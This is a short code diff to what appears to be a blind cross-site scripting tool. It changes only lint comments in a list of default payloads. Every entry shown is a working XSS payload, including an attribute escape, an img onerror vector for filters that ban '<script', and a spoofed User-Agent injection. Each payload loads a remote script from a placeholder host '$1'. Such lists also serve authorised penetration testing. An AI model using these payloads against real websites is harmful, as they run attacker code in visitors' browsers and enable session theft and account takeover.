@@ -87,9 +87,9 @@ DEFAULT_PAYLOADS = [
     DefaultPayload('</script><script src=$1>', None, 'GET', None, 'Reversed'),
     DefaultPayload('&lt;script src=$1&gt;&lt;/script&gt;', None, 'GET', None, 'Generic Encoded'),
     DefaultPayload('&lt;/script&gt;&lt;script src=$1&gt;', None, 'GET', None, 'Generic Reversed'),
-    DefaultPayload('''" onload="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);" garbage="''', None, 'GET', None, 'DOM Attribute Escape'),
-    DefaultPayload("""'"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'For where "<script" is banned'),
-    DefaultPayload("""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 '"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'Promiscuous User Agent')
+    DefaultPayload('''" onload="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);" garbage="''', None, 'GET', None, 'DOM Attribute Escape'),  # noqa
+    DefaultPayload("""'"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'For where "<script" is banned'),  # noqa
+    DefaultPayload("""Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36 '"><img src=x onerror="var s=document.createElement('script');s.src='$1';document.getElementsByTagName('head')[0].appendChild(s);">""", None, 'GET', None, 'Promiscuous User Agent')  # noqa
 ]
 
 
